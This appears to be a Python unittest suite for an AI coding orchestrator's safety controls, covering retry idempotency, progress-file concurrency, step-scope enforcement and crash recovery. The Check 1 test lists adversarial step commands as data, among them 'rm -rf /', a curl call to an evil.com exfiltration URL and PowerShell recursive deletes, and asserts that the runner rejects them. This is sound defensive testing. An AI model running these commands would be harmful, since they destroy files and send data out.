"""Phase 4A.2 — Final Retry, Progress Concurrency & Scope Audit.

Comprehensive regression tests covering:
- Check 1: Retry allowlist is not a security boundary by label alone.
- Check 2: Progress-file temporary-file concurrency and stale cleanup.
- Check 3: Scope enforcement for steps with empty or missing file targets.
- Check 4: Final recovery contract, crash reproduction, and operator reconciliation.
"""
from __future__ import annotations

import concurrent.futures
import hashlib
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from typing import Any, Dict, List, Optional

from core.plans import (
    PlanDocument,
    PlanRegistry,
    PlanStatus,
    save_plan_document,
)
from core.runtime.approval import (
    ApprovalRequest,
    ApprovalService,
    ApprovalStatus,
    CanonicalOperation,
    FileApprovalStore,
)
from core.runtime.capabilities import Capabilities, FilesystemPolicy, NetworkPolicy
from core.runtime.contract import ApprovedExecutionContract
from core.runtime.process import run_hardened_subprocess
from core.runtime.step_runner import (
    AmbiguousStepExecutionError,
    PlanProgressTracker,
    StaleExecutionAuthorizationError,
    StepExecutionStatus,
    StepProgressRecord,
    StructuredStepRunner,
    is_step_safely_idempotent,
)
from core.runtime.transaction import (
    TransactionCoordinator,
    TransactionResult,
    TransactionStatus,
)
from orchestrator import (
    Orchestrator,
    PlanStep,
    RunConfig,
    StepResult,
)


class MockSystem1:
    def __init__(self) -> None:
        self.name = "mock_s1"


class MockSystem2:
    def __init__(self, output_files: Optional[Dict[str, str]] = None) -> None:
        self.guidelines = ""
        self.provider_name = "audit_s2"
        self.model = "mock-model"
        self.output_files = output_files if output_files is not None else {"src/safe.py": "print('audit')"}

    def plan_task(self, task: str, focus_tree: str = "", **kwargs: Any) -> List[PlanStep]:
        return [PlanStep(id="1", description="Audit step", files=list(self.output_files.keys()))]

    def write_code(self, step: PlanStep, task: str, file_contents: Dict[str, str], **kwargs: Any) -> Dict[str, str]:
        return dict(self.output_files)


class TestPhase4A2FinalAudit(unittest.TestCase):
    """Auditing the remaining risks from Phase 4A.1 across Checks 1 through 4."""

    def setUp(self) -> None:
        self.temp_dir = Path(tempfile.mkdtemp(prefix="bf_audit_4a2_")).resolve()
        self.repo_dir = self.temp_dir / "workspace"
        self.repo_dir.mkdir(parents=True)
        self.plans_dir = self.repo_dir / ".brainfrog" / "plans"
        self.plans_dir.mkdir(parents=True)

        # Initialize mock git workspace
        subprocess.run(["git", "init"], cwd=self.repo_dir, capture_output=True, check=True)
        subprocess.run(["git", "config", "user.name", "AuditTester"], cwd=self.repo_dir, capture_output=True, check=True)
        subprocess.run(["git", "config", "user.email", "audit@example.com"], cwd=self.repo_dir, capture_output=True, check=True)
        (self.repo_dir / "README.md").write_text("# Test Repo\n", encoding="utf-8")
        subprocess.run(["git", "add", "README.md"], cwd=self.repo_dir, capture_output=True, check=True)
        subprocess.run(["git", "commit", "-m", "init"], cwd=self.repo_dir, capture_output=True, check=True)

        self.registry = PlanRegistry(self.repo_dir)

    def tearDown(self) -> None:
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def _create_sample_plan(
        self,
        plan_id: str = "plan_4a2_01",
        status: PlanStatus = PlanStatus.READY,
        session_id: str = "cli:audit:session_1",
    ) -> PlanDocument:
        content = (
            f"# Test Plan {plan_id}\n\n"
            "## Architecture\nTest architecture.\n\n"
            "## Acceptance Criteria\n- criterion_1: Test criteria\n\n"
            "## Implementation Steps\n"
            "1. Step 1: src/safe.py\n"
            "2. Step 2: src/extra.py\n"
        )
        save_plan_document(
            self.repo_dir,
            f"{plan_id}.md",
            content,
            metadata={
                "id": plan_id,
                "revision": 1,
                "status": status.value,
                "session_id": session_id,
                "domain": "core",
            },
        )
        return self.registry.get_plan(plan_id)  # type: ignore

    def _create_contract(
        self,
        plan: PlanDocument,
        targets: Optional[List[str]] = None,
        session_id: Optional[str] = None,
        session_incarnation_id: Optional[str] = None,
        expires_at: Optional[float] = None,
    ) -> ApprovedExecutionContract:
        target_list = targets or ["src/safe.py"]
        sess_id = session_id or plan.session_id or "cli:audit:session_1"
        inc_id = session_incarnation_id or "inc_audit_1"

        from core.runtime.approval import InMemoryApprovalStore
        store = InMemoryApprovalStore()
        service = ApprovalService(store)
        op = CanonicalOperation("write_files", target_list[0], {"targets": target_list})

        req = service.create_request(
            session_id=sess_id,
            channel="terminal",
            user_id="alice",
            conversation_id="conv_1",
            operation_type="write_files",
            canonical_operation=op,
            session_incarnation_id=inc_id,
            capabilities=Capabilities(
                filesystem=FilesystemPolicy(write=target_list, read=target_list),
                network=NetworkPolicy(access=True),
            ),
            workspace_root=str(self.repo_dir),
            plan_id=plan.id,
            plan_revision=plan.revision,
            plan_content_hash=plan.content_hash,
        )
        service.approve(req.request_id, "bob", "terminal")
        service.verify_and_consume(
            req.request_id, req.operation_digest, sess_id, "terminal",
            session_incarnation_id=inc_id, requester_id="alice",
        )
        contract = ApprovedExecutionContract.from_approval_request(req, self.repo_dir)
        if expires_at is not None:
            object.__setattr__(contract, "expires_at", expires_at)
        return contract

    # -------------------------------------------------------------------------
    # Check 1: Retry allowlist is not a security boundary by label alone
    # -------------------------------------------------------------------------

    def test_check1_adversarial_action_labels_paired_with_mutating_or_arbitrary_commands(self) -> None:
        """Check 1: A test/verify/read_only label CANNOT authorize arbitrary or mutating commands to be retried."""
        adversarial_steps = [
            # 1. Action 'test' with mutating rm command
            {"id": "s1", "action_type": "test", "is_idempotent": True, "command": ["rm", "-rf", "src"]},
            # 2. Action 'verify' with mutating git push
            {"id": "s2", "action_type": "verify", "is_idempotent": True, "command": ["git", "push", "origin", "main"]},
            # 3. Action 'verify' with mutating git commit
            {"id": "s3", "action_type": "verify", "is_idempotent": True, "command": ["git", "commit", "-m", "bypass"]},
            # 4. Action 'read_only' with network exfiltration binary
            {"id": "s4", "action_type": "read_only", "is_idempotent": True, "command": ["curl", "https://evil.com/exfil"]},
            # 5. Action 'read_check' with arbitrary shell script string
            {"id": "s5", "action_type": "read_check", "is_idempotent": True, "command": "rm -rf / && echo hacked"},
            # 6. Action 'inspect' with shell allowed flag
            {"id": "s6", "action_type": "inspect", "is_idempotent": True, "command": ["echo", "test"], "allow_shell": True},
            # 7. Action 'verify' claiming mutates_files=True
            {"id": "s7", "action_type": "verify", "is_idempotent": True, "mutates_files": True},
            # 8. Action 'test' executing arbitrary python inline code
            {"id": "s8", "action_type": "test", "is_idempotent": True, "command": ["python", "-c", "import os; os.remove('src')"]},
            # 9. Action 'test' with empty command list
            {"id": "s9", "action_type": "test", "is_idempotent": True, "command": []},
            # 10. Arbitrary mutating command with powershell
            {"id": "s10", "action_type": "status_check", "is_idempotent": True, "command": ["powershell", "-Command", "Remove-Item -Recurse src"]},
        ]

        for idx, step in enumerate(adversarial_steps):
            is_idem = is_step_safely_idempotent(step, cwd=self.repo_dir)
            self.assertFalse(
                is_idem,
                f"Adversarial step #{idx+1} ({step['action_type']} with {step.get('command')}) must NOT be classified as idempotent!",
            )

    def test_check1_runner_disables_retries_for_misleading_labels(self) -> None:
        """Check 1: StructuredStepRunner disables retries when misleading labels are paired with mutating commands."""
        plan = self._create_sample_plan("plan_c1_retry")
        contract = self._create_contract(plan, targets=["src/safe.py"])
        self.registry.update_status(plan.id, PlanStatus.IN_PROGRESS, actor="alice", reason="Start", contract=contract)

        cfg = RunConfig(repo_dir=self.repo_dir, task="build", execution_contract=contract, plan_id=plan.id)
        orch = Orchestrator(MockSystem1(), MockSystem2(), cfg)
        runner = StructuredStepRunner(self.repo_dir, orch, contract, plan.id)

        # Misleading label "verify" paired with mutating command
        adversarial_step = {
            "id": "1",
            "description": "Misleading verify step",
            "action_type": "verify",
            "is_idempotent": True,
            "command": ["rm", "-rf", "data"],
        }

        attempts = [0]
        def _fail_step(step: Any, step_id: str) -> Any:
            attempts[0] += 1
            raise RuntimeError("Command failed")

        runner._execute_single_step = _fail_step  # type: ignore

        with self.assertRaises(RuntimeError):
            runner.run_steps([adversarial_step])

        # Must execute exactly once (zero retries) because the command was mutating
        self.assertEqual(attempts[0], 1)
        rec = runner.tracker.get_record("1")
        self.assertIsNotNone(rec)
        self.assertFalse(rec.is_idempotent)
        self.assertEqual(rec.max_retries, 0)
        self.assertEqual(rec.status, StepExecutionStatus.FAILED)

    def test_check1_trusted_read_only_commands_eligible_for_bounded_retry(self) -> None:
        """Check 1: Verified read-only tools (git status, git diff, in-process read) are eligible for bounded retry,
        while test runners (pytest, unittest) are rejected because they can execute mutating code."""
        # Test runners execute arbitrary code that can have side effects -> must NOT be idempotent
        unprovable_steps = [
            {"id": "u1", "action_type": "test", "is_idempotent": True, "command": ["python", "-m", "pytest"]},
            {"id": "u2", "action_type": "test", "is_idempotent": True, "command": ["python", "-m", "unittest"]},
        ]
        for step in unprovable_steps:
            self.assertFalse(
                is_step_safely_idempotent(step, cwd=self.repo_dir),
                f"Test runner step {step['id']} cannot be proven side-effect free and must NOT be idempotent",
            )

        # Strictly verified read-only operations with provably no side-effects
        valid_steps = [
            {"id": "v3", "action_type": "verify", "is_idempotent": True, "command": ["git", "status"]},
            {"id": "v4", "action_type": "verify", "is_idempotent": True, "command": ["git", "diff"]},
            {"id": "v5", "action_type": "read_check", "is_idempotent": True, "files": ["src/safe.py"]},
        ]
        for step in valid_steps:
            self.assertTrue(
                is_step_safely_idempotent(step, cwd=self.repo_dir),
                f"Valid read-only step {step['id']} should be safely idempotent",
            )

    # -------------------------------------------------------------------------
    # Check 2: Progress-file temporary-file concurrency
    # -------------------------------------------------------------------------

    def test_check2_concurrent_progress_writers_preserve_integrity(self) -> None:
        """Check 2: Concurrent progress writes do not delete active writes or corrupt progress."""
        plan_id = "plan_concurrent_01"
        tracker = PlanProgressTracker(self.repo_dir, plan_id)
        steps = [{"id": f"step_{i}", "description": f"Step {i}"} for i in range(20)]
        tracker.initialize_steps(steps)

        errors: List[Exception] = []

        def _worker(worker_id: int) -> None:
            try:
                local_tracker = PlanProgressTracker(self.repo_dir, plan_id)
                for i in range(10):
                    s_id = f"step_{(worker_id + i) % 20}"
                    local_tracker.mark_running(s_id)
                    time.sleep(0.002)
                    local_tracker.mark_passed(s_id, transaction_id=f"tx_{worker_id}_{i}")
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=_worker, args=(w,)) for w in range(6)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(len(errors), 0, f"Concurrent writers threw unexpected errors: {errors}")

        # Verify final progress file is valid JSON and all steps are tracked
        progress_path = self.plans_dir / f"{plan_id}.progress.json"
        self.assertTrue(progress_path.exists())
        final_data = json.loads(progress_path.read_text(encoding="utf-8"))
        self.assertEqual(final_data["plan_id"], plan_id)
        self.assertEqual(len(final_data["steps"]), 20)

    def test_check2_concurrent_initialization_while_write_is_active(self) -> None:
        """Check 2: Initializing tracker while a write is actively executing is safe and race-free."""
        plan_id = "plan_init_race"
        tracker = PlanProgressTracker(self.repo_dir, plan_id)
        tracker.initialize_steps([{"id": "step_0", "description": "initial"}])

        race_errors: List[Exception] = []

        def _heavy_writer() -> None:
            try:
                for i in range(30):
                    tracker.mark_running("step_0")
                    tracker.mark_passed("step_0", transaction_id=f"tx_{i}")
            except Exception as exc:
                race_errors.append(exc)

        def _concurrent_reader() -> None:
            try:
                for _ in range(30):
                    t = PlanProgressTracker(self.repo_dir, plan_id)
                    recs = t.get_records()
                    if not recs:
                        race_errors.append(RuntimeError("Tracker read empty records during concurrent write!"))
            except Exception as exc:
                race_errors.append(exc)

        t1 = threading.Thread(target=_heavy_writer)
        t2 = threading.Thread(target=_concurrent_reader)
        t1.start()
        t2.start()
        t1.join()
        t2.join()

        self.assertEqual(len(race_errors), 0, f"Races detected during concurrent read/write: {race_errors}")

    def test_check2_cleanup_preserves_active_temporary_files_and_deletes_stale_ones(self) -> None:
        """Check 2: _clean_stale_tmp_files preserves young tmp files (<60s) but cleans stale ones (>60s)."""
        plan_id = "plan_tmp_cleanup"
        tracker = PlanProgressTracker(self.repo_dir, plan_id)

        # 1. Create a freshly active .tmp_ file (e.g. 2 seconds old)
        active_tmp = self.plans_dir / f"{plan_id}.tmp_{os.urandom(4).hex()}"
        active_tmp.write_text("{\"active\": true}", encoding="utf-8")

        # 2. Create an abandoned stale .tmp_ file (> 60 seconds old)
        stale_tmp = self.plans_dir / f"{plan_id}.tmp_{os.urandom(4).hex()}"
        stale_tmp.write_text("{\"stale\": true}", encoding="utf-8")
        stale_mtime = time.time() - 150.0  # 150 seconds ago
        os.utime(str(stale_tmp), (stale_mtime, stale_mtime))

        # 3. Create a non-tmp file (must never be deleted)
        non_tmp = self.plans_dir / f"{plan_id}.progress.json"
        non_tmp.write_text("{\"valid\": true}", encoding="utf-8")

        # Run cleanup
        tracker._clean_stale_tmp_files()

        # Active temporary file (<60s) MUST still exist
        self.assertTrue(active_tmp.exists(), "Active temporary write was deleted prematurely!")
        # Stale temporary file (>60s) MUST be removed
        self.assertFalse(stale_tmp.exists(), "Stale temporary file was not cleaned up!")
        # Non-tmp file MUST NOT be touched
        self.assertTrue(non_tmp.exists(), "Non-tmp progress file was deleted!")

    # -------------------------------------------------------------------------
    # Check 3: Scope for steps with no file targets
    # -------------------------------------------------------------------------

    def test_check3_step_with_empty_files_cannot_mutate_workspace(self) -> None:
        """Check 3: A step with files=[] attempting to mutate workspace is rejected before staging."""
        plan = self._create_sample_plan("plan_c3_empty")
        contract = self._create_contract(plan, targets=["src/safe.py"])
        self.registry.update_status(plan.id, PlanStatus.IN_PROGRESS, actor="alice", reason="Start", contract=contract)

        # System 2 returns files to mutate, but step has files=[]
        s2_mutator = MockSystem2(output_files={"src/safe.py": "malicious mutation"})
        cfg = RunConfig(repo_dir=self.repo_dir, task="build", execution_contract=contract, plan_id=plan.id)
        orch = Orchestrator(MockSystem1(), s2_mutator, cfg)

        step_empty_files = PlanStep(id="1", description="Empty files check step", files=[])

        # Step scope check must reject the mutation immediately
        with self.assertRaises(PermissionError) as ctx:
            orch._run_step(step_empty_files)

        self.assertIn("declared no file targets", str(ctx.exception))
        # Ensure zero files written to disk
        self.assertFalse((self.repo_dir / "src" / "safe.py").exists())

    def test_check3_step_with_missing_files_field_cannot_mutate_workspace(self) -> None:
        """Check 3: A step payload with missing/None files field is rejected if it mutates files."""
        plan = self._create_sample_plan("plan_c3_missing")
        contract = self._create_contract(plan, targets=["src/safe.py"])
        self.registry.update_status(plan.id, PlanStatus.IN_PROGRESS, actor="alice", reason="Start", contract=contract)

        s2_mutator = MockSystem2(output_files={"src/safe.py": "sneaky mutation"})
        cfg = RunConfig(repo_dir=self.repo_dir, task="build", execution_contract=contract, plan_id=plan.id)
        orch = Orchestrator(MockSystem1(), s2_mutator, cfg)

        # Dictionary payload without 'files' key
        step_dict = {"id": "1", "description": "Step with no files key"}

        with self.assertRaises(PermissionError) as ctx:
            orch._run_step(step_dict)  # type: ignore

        self.assertIn("declared no file targets", str(ctx.exception))
        self.assertFalse((self.repo_dir / "src" / "safe.py").exists())

    def test_check3_unapproved_filesystem_targets_rejected_fail_closed(self) -> None:
        """Check 3: Step attempting to mutate files outside its approved step scope fails closed."""
        plan = self._create_sample_plan("plan_c3_unapproved")
        contract = self._create_contract(plan, targets=["src/safe.py", "src/unapproved.py"])
        self.registry.update_status(plan.id, PlanStatus.IN_PROGRESS, actor="alice", reason="Start", contract=contract)

        # System 2 attempts to write src/unapproved.py, but step only scoped to src/safe.py
        s2_mutator = MockSystem2(output_files={"src/unapproved.py": "unapproved content"})
        cfg = RunConfig(repo_dir=self.repo_dir, task="build", execution_contract=contract, plan_id=plan.id)
        orch = Orchestrator(MockSystem1(), s2_mutator, cfg)

        step_scoped = PlanStep(id="1", description="Scoped step", files=["src/safe.py"])

        with self.assertRaises(PermissionError) as ctx:
            orch._run_step(step_scoped)

        self.assertIn("outside planned step scope", str(ctx.exception))
        self.assertFalse((self.repo_dir / "src" / "unapproved.py").exists())

    def test_check3_malformed_step_payload_fails_closed(self) -> None:
        """Check 3: Malformed step payload (empty id or missing id) fails closed in runner."""
        plan = self._create_sample_plan("plan_c3_malformed")
        contract = self._create_contract(plan, targets=["src/safe.py"])
        self.registry.update_status(plan.id, PlanStatus.IN_PROGRESS, actor="alice", reason="Start", contract=contract)

        cfg = RunConfig(repo_dir=self.repo_dir, task="build", execution_contract=contract, plan_id=plan.id)
        orch = Orchestrator(MockSystem1(), MockSystem2(), cfg)
        runner = StructuredStepRunner(self.repo_dir, orch, contract, plan.id)

        # Malformed step without id
        malformed_step = {"description": "no id present"}

        with self.assertRaises(ValueError) as ctx:
            runner.run_steps([malformed_step])

        self.assertIn("malformed", str(ctx.exception).lower())

    # -------------------------------------------------------------------------
    # Check 4: Final recovery contract & operator reconciliation
    # -------------------------------------------------------------------------

    def test_check4_reproduce_crash_after_transaction_commit_before_progress_passed(self) -> None:
        """Check 4: Crash after transaction commit but before progress PASSED leaves step RUNNING and journal VERIFIED."""
        plan = self._create_sample_plan("plan_c4_crash")
        contract = self._create_contract(plan, targets=["src/safe.py"])
        self.registry.update_status(plan.id, PlanStatus.IN_PROGRESS, actor="alice", reason="Start", contract=contract)

        # 1. Mutate and commit transactionally to simulate a committed transaction
        from core.runtime.workspace_lock import WorkspaceLock
        ws_lock = WorkspaceLock(
            workspace=self.repo_dir,
            session_id=contract.session_id,
            task_id="task_audit",
            actor="audit_actor",
        )
        ws_lock.acquire()
        try:
            coord = TransactionCoordinator(
                workspace=self.repo_dir,
                contract=contract,
                work_id="work_c4",
                plan_id=plan.id,
                session_id=contract.session_id,
            )
            coord.begin()
            coord.stage_create("src/safe.py", "print('committed safely')")
            coord.execute()
            coord.record_domain_verification(command=["pytest"], passed=True, returncode=0)
            tx_res = coord.commit(status=TransactionStatus.VERIFIED)
            self.assertTrue(tx_res.success)
            self.assertEqual(tx_res.status, TransactionStatus.VERIFIED)
        finally:
            ws_lock.release()

        # Verify file is committed on disk
        self.assertEqual((self.repo_dir / "src" / "safe.py").read_text(encoding="utf-8"), "print('committed safely')")

        # 2. Simulate progress state: step was marked RUNNING (is_idempotent=False) but crash occurred before mark_passed!
        tracker = PlanProgressTracker(self.repo_dir, plan.id)
        tracker.initialize_steps([PlanStep(id="1", description="Step 1", files=["src/safe.py"])])
        tracker.mark_running("1", is_idempotent=False, max_retries=0)
        # Process exits abruptly without mark_passed!

        # 3. Recovery runner starts
        cfg = RunConfig(repo_dir=self.repo_dir, task="build", execution_contract=contract, plan_id=plan.id)
        orch = Orchestrator(MockSystem1(), MockSystem2(), cfg)
        reloaded_tracker = PlanProgressTracker(self.repo_dir, plan.id)
        runner = StructuredStepRunner(self.repo_dir, orch, contract, plan.id, tracker=reloaded_tracker)

        # 4. Prove runner REFUSES to replay the ambiguous step
        with self.assertRaises(AmbiguousStepExecutionError) as ctx:
            runner.run_steps([PlanStep(id="1", description="Step 1", files=["src/safe.py"])])

        self.assertEqual(ctx.exception.step_id, "1")
        self.assertIn("non-idempotent state", str(ctx.exception))

        # 5. Verify the runner did NOT automatically mark step PASSED
        rec = reloaded_tracker.get_record("1")
        self.assertIsNotNone(rec)
        self.assertEqual(rec.status, StepExecutionStatus.RUNNING)

    def test_check4_operator_reconciliation_procedure(self) -> None:
        """Check 4: Operator reconciliation protocol requires verification evidence and prevents stale reuse."""
        plan = self._create_sample_plan("plan_c4_reconcile")
        contract = self._create_contract(plan, targets=["src/safe.py"])
        self.registry.update_status(plan.id, PlanStatus.IN_PROGRESS, actor="alice", reason="Start", contract=contract)

        tracker = PlanProgressTracker(self.repo_dir, plan.id)
        tracker.initialize_steps([PlanStep(id="1", description="Step 1", files=["src/safe.py"])])
        tracker.mark_running("1", is_idempotent=False)

        # Step is ambiguous
        ambiguous = tracker.check_ambiguous_interrupted_step()
        self.assertIsNotNone(ambiguous)

        # Attempting reconciliation without evidence fails closed
        with self.assertRaises(ValueError):
            tracker.reconcile_ambiguous_step("1", new_status=StepExecutionStatus.PASSED, verification_evidence="", operator="alice")

        # Attempting reconciliation without operator fails closed
        with self.assertRaises(ValueError):
            tracker.reconcile_ambiguous_step("1", new_status=StepExecutionStatus.PASSED, verification_evidence="tx verified", operator="")

        # Attempting reconciliation with non-terminal status fails closed
        with self.assertRaises(ValueError):
            tracker.reconcile_ambiguous_step("1", new_status=StepExecutionStatus.RUNNING, verification_evidence="tx verified", operator="alice")

        # Valid operator reconciliation with verified evidence
        rec = tracker.reconcile_ambiguous_step(
            "1",
            new_status=StepExecutionStatus.PASSED,
            verification_evidence="Transaction tx_001 committed VERIFIED on disk; pytest acceptance tests passed.",
            operator="lead_operator_alice",
        )

        self.assertEqual(rec.status, StepExecutionStatus.PASSED)
        self.assertIn("tx_001 committed VERIFIED", rec.evidence)  # type: ignore
        self.assertEqual(rec.reconciled_by, "lead_operator_alice")
        self.assertIsNotNone(rec.reconciled_at)

        # Ambiguous check is now resolved
        self.assertIsNone(tracker.check_ambiguous_interrupted_step())

    def test_check4_stale_consumed_contract_cannot_be_reused_after_reconciliation(self) -> None:
        """Check 4: Consumed contract cannot be re-used after crash; fresh contract required for subsequent steps."""
        plan = self._create_sample_plan("plan_c4_consumed")
        targets = ["src/safe.py", "src/extra.py"]

        store = FileApprovalStore(self.repo_dir / ".brainfrog" / "approvals")
        service = ApprovalService(store)
        op = CanonicalOperation("write_files", targets[0], {"targets": targets})

        req = service.create_request(
            session_id=plan.session_id,
            channel="terminal",
            user_id="alice",
            conversation_id="conv_1",
            operation_type="write_files",
            canonical_operation=op,
            session_incarnation_id="inc_c4",
            capabilities=Capabilities(FilesystemPolicy(write=targets, read=targets)),
            workspace_root=str(self.repo_dir),
            plan_id=plan.id,
            plan_revision=plan.revision,
            plan_content_hash=plan.content_hash,
        )
        service.approve(req.request_id, "bob", "terminal")

        # First consumption succeeds
        ok1, consumed_req, _ = service.verify_and_consume(
            req.request_id, req.operation_digest, plan.session_id, "terminal",
            session_incarnation_id="inc_c4", requester_id="alice",
        )
        self.assertTrue(ok1)
        assert consumed_req is not None
        contract = ApprovedExecutionContract.from_approval_request(consumed_req, self.repo_dir)

        # Simulate crash & operator reconciling step 1
        tracker = PlanProgressTracker(self.repo_dir, plan.id)
        tracker.initialize_steps([
            PlanStep(id="1", description="Step 1", files=["src/safe.py"]),
            PlanStep(id="2", description="Step 2", files=["src/extra.py"]),
        ])
        tracker.reconcile_ambiguous_step(
            "1",
            new_status=StepExecutionStatus.PASSED,
            verification_evidence="Operator verified step 1 tx committed cleanly",
            operator="alice",
        )

        # Attempting to re-consume the already consumed contract for step 2 must fail closed
        ok2, _, reason = service.verify_and_consume(
            contract.request_id, req.operation_digest, plan.session_id, "terminal",
            session_incarnation_id="inc_c4", requester_id="alice",
        )
        self.assertFalse(ok2)
        self.assertIn("already been consumed", reason.lower())


if __name__ == "__main__":
    unittest.main()
